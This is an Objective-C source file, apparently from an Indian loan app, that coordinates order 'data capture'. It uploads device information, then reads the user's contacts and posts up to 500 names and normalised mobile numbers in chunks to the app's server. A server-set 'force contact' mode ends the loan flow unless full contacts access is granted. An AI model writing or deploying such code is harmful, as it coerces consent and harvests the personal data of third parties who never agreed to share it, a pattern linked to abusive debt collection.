

#import "HQITOrderDataCaptureCoordinator.h"
#import "HQITNetworkClient.h"
#import "HQITNetworkResponse.h"
#import "HQITDeviceInfoCollector.h"
#import "HQITAppConfigHelper.h"
#import "HQITAppStartupManager.h"
#import "HQITHUDHelper.h"
#import "HQITIndianPhoneValidator.h"
#import "HQITPermissionSecondaryPresenter.h"
#import "HQITBuryRecorder.h"
#import "HQITDialogs.h"
#import "HQITBaseDialog.h"
#import "HQITAppShell.h"
#import "HQITAccurateRecommendationViewController.h"
#import "HQITLoanApplyViewController.h"
#import "HQITHomeLoanViewController.h"
#import <Contacts/Contacts.h>
#import <UIKit/UIKit.h>
#import <objc/runtime.h>

static NSString * const kHQITContactsPromptShownKey = @"HQITContactsSystemPromptShown";

@interface HQITOrderDataCaptureCoordinator ()
@property (nonatomic, copy) NSString *orderId;
@property (nonatomic, weak) UIViewController *hostVC;
@property (nonatomic, copy) HQITCaptureCompletion completion;
@property (nonatomic, strong, nullable) HQITBaseDialog *progressDialog;
@property (nonatomic, assign) BOOL forceContact;
@end

@implementation HQITOrderDataCaptureCoordinator

+ (void)startWithOrderId:(NSString *)orderId
      hostViewController:(UIViewController *)hostVC
              completion:(HQITCaptureCompletion)completion {
    HQITOrderDataCaptureCoordinator *c = [[HQITOrderDataCaptureCoordinator alloc] init];
    c.orderId = orderId ?: @"";
    c.hostVC = hostVC;
    c.completion = [completion copy];
    c.forceContact = [c isForceMode];
    // Retain via associated object on host until done
    objc_setAssociatedObject(hostVC, @selector(startWithOrderId:hostViewController:completion:), c, OBJC_ASSOCIATION_RETAIN_NONATOMIC);
    [c stageDevice];
}

- (BOOL)isForceMode {
    return [[HQITAppStartupManager shared] isForceContactMode];
}

- (UIView *)hostWindow {
    return [HQITAppShell shared].window ?: self.hostVC.view.window ?: self.hostVC.view;
}

- (void)finish:(BOOL)success {
    [HQITHUDHelper hideLoading];
    [self.progressDialog dismissAnimated:YES];
    self.progressDialog = nil;
    NSLog(@"[HQITCapture] finish success=%d orderId=%@ host=%@",
          success, self.orderId ?: @"", NSStringFromClass([self.hostVC class]));
    if (self.completion) self.completion(success);
    if (self.hostVC) {
        objc_setAssociatedObject(self.hostVC, @selector(startWithOrderId:hostViewController:completion:), nil, OBJC_ASSOCIATION_RETAIN_NONATOMIC);
    }
}

#pragma mark - Stage A device

- (void)stageDevice {
    [HQITHUDHelper showLoading];
    NSLog(@"[HQITCapture] stageDevice orderId=%@ host=%@ forceContact=%d",
          self.orderId ?: @"", NSStringFromClass([self.hostVC class]), self.forceContact);
    __weak typeof(self) weakSelf = self;
    [HQITDeviceInfoCollector collectDeviceInfoForOrder:self.orderId ?: @""
                                            completion:^(NSDictionary<NSString *,NSString *> *info) {
        __strong typeof(weakSelf) self = weakSelf;
        if (!self) return;
        NSString *oid = self.orderId ?: @"";
        [[HQITNetworkClient shared] requestWithEndpoint:@"/app/v3/mobile/device"
                                             signedData:@{@"orderId": oid}
                                           unsignedData:info ?: @{}
                                            showLoading:@NO
                                         showErrorToast:@NO
                                                success:^(HQITNetworkResponse *response) {
            __strong typeof(weakSelf) self = weakSelf;
            if (!self) return;
            [HQITHUDHelper hideLoading];
            [self stageContactsPermission];
        } failure:^(NSError *error, NSString *message) {
            __strong typeof(weakSelf) self = weakSelf;
            if (!self) return;
            [HQITHUDHelper hideLoading];
            [HQITHUDHelper showToast:message.length ? message : @"Device upload failed"];
            [self finish:NO];
        }];
    }];
}

#pragma mark - Stage B contacts permission

- (void)stageContactsPermission {
    [HQITHUDHelper hideLoading];
    // Re-read config in case app/config arrived after coordinator start.
    self.forceContact = [self isForceMode];
    CNAuthorizationStatus status = [CNContactStore authorizationStatusForEntityType:CNEntityTypeContacts];
    NSLog(@"[HQITCapture] stageContactsPermission status=%d force=%d host=%@",
          (int)status, (int)self.forceContact, NSStringFromClass([self.hostVC class]));
    if (status == CNAuthorizationStatusNotDetermined) {
        CNContactStore *store = [[CNContactStore alloc] init];
        __weak typeof(self) weakSelf = self;
        [store requestAccessForEntityType:CNEntityTypeContacts completionHandler:^(BOOL granted, NSError *error) {
            (void)granted;
            (void)error;
            dispatch_async(dispatch_get_main_queue(), ^{
                __strong typeof(weakSelf) self = weakSelf;
                if (!self) return;
                [[NSUserDefaults standardUserDefaults] setBool:YES forKey:kHQITContactsPromptShownKey];
                CNAuthorizationStatus after = [CNContactStore authorizationStatusForEntityType:CNEntityTypeContacts];
                [self handleContactsAuthorizationResolved:after];
            });
        }];
        return;
    }
    [self handleContactsAuthorizationResolved:status];
}

- (BOOL)hqit_isContactsLimited:(CNAuthorizationStatus)status {
    if (@available(iOS 18.0, *)) {
        return status == CNAuthorizationStatusLimited;
    }
    return NO;
}

/// Full access, or iOS 18+ Limited (can still enumerate the selected subset).
- (BOOL)hqit_canReadContacts:(CNAuthorizationStatus)status {
    if (status == CNAuthorizationStatusAuthorized) return YES;
    return [self hqit_isContactsLimited:status];
}

- (void)hqit_buryContactsAuthorizationStatus:(CNAuthorizationStatus)status {
    if (status == CNAuthorizationStatusAuthorized) {
        [HQITBuryRecorder recordContactsPermissionGranted:YES]; // 19
        return;
    }
    if ([self hqit_isContactsLimited:status]) {
        [HQITBuryRecorder recordContactsPermissionLimited]; // 198
        return;
    }
    [HQITBuryRecorder recordContactsPermissionGranted:NO]; // 20
}

- (void)handleContactsAuthorizationResolved:(CNAuthorizationStatus)status {
    self.forceContact = [self isForceMode];
    [self hqit_buryContactsAuthorizationStatus:status];
    NSLog(@"[HQITCapture] contacts resolved status=%d force=%d", (int)status, (int)self.forceContact);

    if (self.forceContact) {
        if (status == CNAuthorizationStatusAuthorized) {
            [self startPipelineAllowContact:@""];
            return;
        }
        // Limited or unauthorized → custom dialog; Cancel/Confirm both interrupt
        NSLog(@"[HQITCapture] force contacts not full auth → secondary guide");
        [self presentContactsSecondaryGuide];
        return;
    }

    // Non-force: never show custom dialog. Has contacts → upload; none → skip; never abort.
    [self continueNonForceContactsWithStatus:status];
}

- (void)continueNonForceContactsWithStatus:(CNAuthorizationStatus)status {
    NSString *allow = (status == CNAuthorizationStatusAuthorized) ? @"" : @"2";
    if ([self hqit_canReadContacts:status]) {
        NSLog(@"[HQITCapture] non-force canRead → try upload (allowContact=%@)", allow);
        [self startPipelineAllowContact:allow skipContactUpload:NO];
        return;
    }
    NSLog(@"[HQITCapture] non-force no access → skip upload ready allowContact=2");
    [self startPipelineAllowContact:@"2" skipContactUpload:YES];
}

- (void)presentContactsSecondaryGuide {
    // Force mode only: Limited / unauthorized.
    __weak typeof(self) weakSelf = self;
    UIView *host = [self hostWindow];
    NSLog(@"[HQITCapture] contacts secondary guide (force) host=%@",
          NSStringFromClass([self.hostVC class]));
    void (^exitFlow)(void) = ^{
        __strong typeof(weakSelf) self = weakSelf;
        if (!self) return;
        [self finishContactsInterrupted];
    };
    [HQITPermissionSecondaryPresenter showContactsSettingsGuideInView:host
                                                            onConfirm:exitFlow
                                                             onCancel:exitFlow];
    UIView *top = host.subviews.lastObject;
    if (top) [host bringSubviewToFront:top];
}

- (void)finishContactsInterrupted {
    [self finish:NO];
    UIViewController *host = self.hostVC;
    if ([host isKindOfClass:[HQITHomeLoanViewController class]]) {
        NSLog(@"[HQITCapture] contacts abort on home → end flow only (no pop)");
        return;
    }
    UINavigationController *nav = host.navigationController;
    if (!nav || nav.viewControllers.count <= 1) return;
    if (nav.topViewController != host) return;
    if ([host isKindOfClass:[HQITAccurateRecommendationViewController class]]) {
        NSLog(@"[HQITCapture] contacts abort → popToRoot (recommend → home)");
        [nav popToRootViewControllerAnimated:YES];
        return;
    }
    if ([host isKindOfClass:[HQITLoanApplyViewController class]]) {
        NSLog(@"[HQITCapture] contacts abort → pop (loan apply)");
        [nav popViewControllerAnimated:YES];
    }
}

- (void)startPipelineAllowContact:(NSString *)allowContact {
    [self startPipelineAllowContact:allowContact skipContactUpload:NO];
}

- (void)startPipelineAllowContact:(NSString *)allowContact skipContactUpload:(BOOL)skip {
    if (!self.progressDialog) {
        self.progressDialog = [HQITDialogs showCaptureProgressInView:[self hostWindow]];
    }
    NSLog(@"[HQITCapture] startPipeline allowContact=%@ skipUpload=%d",
          allowContact ?: @"", skip);
    if (skip) {
        [self callReadyAllowContact:allowContact];
        return;
    }
    __weak typeof(self) weakSelf = self;
    NSString *allow = [allowContact copy] ?: @"";
    dispatch_async(dispatch_get_global_queue(QOS_CLASS_USER_INITIATED, 0), ^{
        NSArray *contacts = [weakSelf loadCleanedContacts];
        dispatch_async(dispatch_get_main_queue(), ^{
            __strong typeof(weakSelf) self = weakSelf;
            if (!self) return;
            NSLog(@"[HQITCapture] cleaned contacts count=%ld → %@",
                  (long)contacts.count,
                  contacts.count == 0 ? @"skip mobile/contact" : @"POST /app/v3/mobile/contact");
            if (contacts.count == 0) {
                [self callReadyAllowContact:allow];
                return;
            }
            [self uploadContacts:contacts allowContact:allow];
        });
    });
}

#pragma mark - Contacts load / upload

- (NSArray<NSDictionary *> *)loadCleanedContacts {
    CNAuthorizationStatus status = [CNContactStore authorizationStatusForEntityType:CNEntityTypeContacts];
    // Non-force may read Limited subset; Denied/Restricted → empty (caller skips upload).
    if (![self hqit_canReadContacts:status]) {
        return @[];
    }
    NSInteger maxCount = [HQITAppConfigHelper integerForConfigKey:@"pushMaxCount" defaultValue:500];
    CNContactStore *store = [[CNContactStore alloc] init];
    NSArray *keys = @[CNContactGivenNameKey, CNContactFamilyNameKey, CNContactPhoneNumbersKey];
    CNContactFetchRequest *req = [[CNContactFetchRequest alloc] initWithKeysToFetch:keys];
    NSMutableArray *rows = [NSMutableArray array];
    NSMutableSet *seen = [NSMutableSet set];
    NSError *err = nil;
    NSString *nowMs = [NSString stringWithFormat:@"%lld", (long long)([[NSDate date] timeIntervalSince1970] * 1000)];
    [store enumerateContactsWithFetchRequest:req error:&err usingBlock:^(CNContact *contact, BOOL *stop) {
        NSString *family = contact.familyName ?: @"";
        NSString *given = contact.givenName ?: @"";
        NSString *name = [[NSString stringWithFormat:@"%@ %@", family, given]
                          stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet]] ?: @"";
        for (CNLabeledValue<CNPhoneNumber *> *lv in contact.phoneNumbers) {
            NSString *raw = lv.value.stringValue ?: @"";
            NSString *phone = [HQITIndianPhoneValidator normalizedIndianMobileFrom:raw];
            if (phone.length != 10) continue;
            if ([seen containsObject:phone]) continue;
            [seen addObject:phone];
            [rows addObject:@{
                @"contactName": name,
                @"contactPhone": phone,
                @"contactUpdateTime": nowMs,
                @"contactStorage": @"0",
                @"contactCount": @"-99",
                @"contactTime": @"",
            }];
            if ((NSInteger)rows.count >= maxCount) {
                *stop = YES;
                return;
            }
        }
    }];
    return rows;
}

- (void)uploadContacts:(NSArray<NSDictionary *> *)all allowContact:(NSString *)allowContact {
    NSInteger per = [HQITAppConfigHelper integerForConfigKey:@"pushPerCount" defaultValue:50];
    if (per <= 0) per = 50;
    [self uploadChunkFrom:all offset:0 per:per allowContact:allowContact];
}

- (void)uploadChunkFrom:(NSArray *)all offset:(NSInteger)offset per:(NSInteger)per allowContact:(NSString *)allowContact {
    if (offset >= (NSInteger)all.count) {
        [self callReadyAllowContact:allowContact];
        return;
    }
    NSInteger end = MIN(offset + per, (NSInteger)all.count);
    NSArray *chunk = [all subarrayWithRange:NSMakeRange(offset, end - offset)];
    __weak typeof(self) weakSelf = self;
    [[HQITNetworkClient shared] requestWithEndpoint:@"/app/v3/mobile/contact"
                                         signedData:@{@"orderId": self.orderId ?: @""}
                                       unsignedData:@{@"list": chunk}
                                        showLoading:@NO
                                     showErrorToast:@NO
                                            success:^(HQITNetworkResponse *response) {
        __strong typeof(weakSelf) self = weakSelf;
        if (!self) return;
        [self uploadChunkFrom:all offset:end per:per allowContact:allowContact];
    } failure:^(NSError *error, NSString *message) {
        __strong typeof(weakSelf) self = weakSelf;
        if (!self) return;
        [HQITHUDHelper showToast:message.length ? message : @"Contact upload failed"];
        [self finish:NO];
    }];
}

- (void)callReadyAllowContact:(NSString *)allowContact {
    [self requestReadyAllowContact:allowContact];
}

- (void)requestReadyAllowContact:(NSString *)allowContact {
    __weak typeof(self) weakSelf = self;
    [[HQITNetworkClient shared] requestWithEndpoint:@"/app/v3/order/ready"
                                         signedData:@{@"orderId": self.orderId ?: @""}
                                       unsignedData:@{@"allowContact": allowContact ?: @""}
                                        showLoading:@NO
                                     showErrorToast:@NO
                                            success:^(HQITNetworkResponse *response) {
        __strong typeof(weakSelf) self = weakSelf;
        if (!self) return;
        [self finish:YES];
    } failure:^(NSError *error, NSString *message) {
        __strong typeof(weakSelf) self = weakSelf;
        if (!self) return;
        [HQITHUDHelper showToast:message.length ? message : @"Ready failed"];
        [self finish:NO];
    }];
}

@end
